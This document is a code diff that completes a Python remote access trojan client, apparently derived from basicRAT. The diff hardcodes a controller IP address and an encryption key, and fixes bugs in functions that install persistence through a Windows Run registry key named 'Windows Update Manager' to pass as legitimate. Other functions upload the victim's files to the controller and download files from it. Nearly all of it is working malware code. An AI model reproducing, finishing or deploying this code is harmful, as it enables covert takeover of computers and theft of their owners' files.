@@ -6,7 +6,7 @@ import socket
 
 import time
 import random
-import system
+import sys
 import os
 
 #commands execution
@@ -27,9 +27,9 @@ from Crypto.Hash import SHA256
 
 
 #Variables
-Host = ""                    #Server IP
+Host = "192.168.1.16"                    #Server IP
 port = 80                    #Connection Port
-key = ""                     #Encryption key (16 characters) use the same on server script
+key = "0123456789101112"                     #Encryption key (16 characters) use the same on server script
 
 
 
@@ -42,7 +42,7 @@ def send(msg):
 
 #acquire system plateform
 def getSystemOs():
-	plat = sys.platform
+    plat = sys.platform
     if plat.startswith('win'):
         plat = 'win'
     elif plat.startswith('linux'):
@@ -51,16 +51,16 @@ def getSystemOs():
         plat = 'mac'
     else:
         plat = 'unk'
-	return plat
+    return plat
 
 #encryption see https://github.com/vesche/basicRAT/blob/master/core/crypto.py
 def encrypt(key, plaintext):
     #prepare text to encryption (a 16 characters long string is required)
-    plaintext = plaintext + b"\0" * (AES.block_size - len(plaintext) % AES.block_size)
-	
-    iv = Random.new().red(AES.block_size)
+    plaintext = plaintext + "\0" * (AES.block_size - len(plaintext) % AES.block_size)
+
+    iv = Random.new().read(AES.block_size)
     cipher = AES.new(key, AES.MODE_CBC, iv)
-	return iv + cipher.encrypt(plaintext)
+    return iv + cipher.encrypt(plaintext)
 
 def decrypt(key, ciphertext):
     iv = ciphertext[:AES.block_size]
@@ -87,9 +87,9 @@ def persistence(plat):
             return "HKEY_CURRENT_USER Run registry key applied"
         except WindowsError:
             return "HKEY_CURRENT_USER Run registry key failed"
-    if plat == "nix":
+    #if plat == "nix":
         #device not yet supported
-    if plat == "unk":
+    #if plat == "unk":
         #device not yet supported
 
 def execute():
@@ -117,9 +117,9 @@ def uninstall():
             return "HKEY_CURRENT_USER Run registry key deleted"
         except WindowsError:
             return "HKEY_CURRENT_USER Run registry key deleting failed"
-    if plat == "nix":
+    #if plat == "nix":
         #device not yet supported
-    if plat == "unk":
+    #if plat == "unk":
         #device not yet supported
     #delete RAT files
     soc.close()
@@ -127,7 +127,7 @@ def uninstall():
     
 def download():
     data_bytes = []
-    continue = True
+    ctn = True
     i = 1
     received = ""
     received = soc.recv(4096)
@@ -135,7 +135,7 @@ def download():
     #name_file = received[0].split(\) #only for a file from windows|for file from linux used .split(/) #pk [-1]? plutot [0] non?
     name_file = received[0] #contain path to paste not just file name
     size = received[1]
-    while continue:
+    while ctn:
         received = soc.recv(4096)
         i += 1
         if received == b"Upload finished":
@@ -151,11 +151,11 @@ def download():
                     file.close()
                 i += 1
                 if i == len(data_bytes):
-                    continue = False
+                    ctn = False
         else:
             data_bytes.append(received)
         if not received:
-            continue = False
+            ctn = False
     
 
 def upload(path_file):
@@ -164,28 +164,29 @@ def upload(path_file):
         file = open(path_file, "rb")
         file.close
     except:
-        break
-    octets = os.path.getsize(path_file) / 1024
-    info = (path_file, octets)
-    soc.send(info)
-    num = 0
-    octets = octets * 1024
-    file = open(path_file, "rb") #open file in read only and binary mod
-    if octets > 1024:
-        if (octets / 1024) != 0:
-            octets = round(octets / 1024 + 1)
+        do = False
+    if do:
+        octets = os.path.getsize(path_file) / 1024
+        info = (path_file, octets)
+        soc.send(info)
+        num = 0
+        octets = octets * 1024
+        file = open(path_file, "rb") #open file in read only and binary mod
+        if octets > 1024:
+            if (octets / 1024) != 0:
+                octets = round(octets / 1024 + 1)
+            else:
+                octets = octets / 1024
+            for i in range(octets):
+                file.seek(num, 0)
+                donnees = file.read(1024)
+                soc.send(encrypt(key, donnees))
+                num += 1024
         else:
-            octets = octets / 1024
-        for i in range(octets):
-            file.seek(num, 0)
-            donnees = file.read(1024)
-            soc.send(encrypt(key, donnees))
-            num += 1024
-    else:
-        donnees = file.read()
-        soc.send(donnees)
-    file.close
-    soc.send(encrypt(key, "Upload finished"))
+            donnees = file.read()
+            soc.send(donnees)
+        file.close
+        soc.send(encrypt(key, "Upload finished"))
 
 
 
@@ -202,39 +203,50 @@ def main():
         plat = 'mac'
     else:
         plat = 'unk'
+    print(plat)
 
         
     ##verify if the key is in the registers to automaticaly start this RAT
     
     if plat == 'win':
+        print("platform is windows")
         run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
         try:
             reg_key = winreg.OpenKey(HKEY_CURRENT_USER, run_key, 0, winreg.KEY_ALL_ACCESS)
             i = 0
             key_name = ""
-            while winreg.EnumValue(reg_key, i) != key_name:
-                key_name = winreg.EnumValue(reg_key, i)       #des lignes pour rien
-                i += 1                                        #bcp de lignes pour rien...
-                if key_name[0] == "Windows Update Manager":
-                    indic = 1
+            #while winreg.EnumValue(reg_key, i) != key_name:
+            while True:
+                try:
+                    key_name = winreg.EnumValue(reg_key, i)       #des lignes pour rien
+                    i += 1                                        #bcp de lignes pour rien...
+                    print(key_name)
+                    if key_name[0] == "Windows Update Manager":
+                        indic = 1
+                        break
+                except:
+                    indic = 0
                     break
             if indic == 1:
-                #return "Key is already in registers"
-            if indic == 0:
-                #return "Key is not yet in registers"
-                persistence()
+                result = "Key is already in registers"
+                print(result)
+            elif indic == 0:
+                result = "Key is not yet in registers"
+                print(result)
+                answ = persistence(plat)
+                print(answ)
         except WindowsError:
             pass
             #return "HKEY_CURRENT_USER Run registry key verification failed"
-    if plat == "nix":
+    #elif plat == "nix":
         #device not yet supported
-    if plat == "unk":
+    #elif plat == "unk":
         #device not yet supported
 
         
     ##try connecting to the server
     
-	soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     host = socket.gethostname()
     #soc.bind((host, port)) #not necessary ?
     connected = False
@@ -242,6 +254,7 @@ def main():
         try:
             soc.connect((Host, port))
             connected = True
+            print("connected to server")
         except:
             sleepTime = random.randint(20, 30)
             time.sleep(sleepTime)
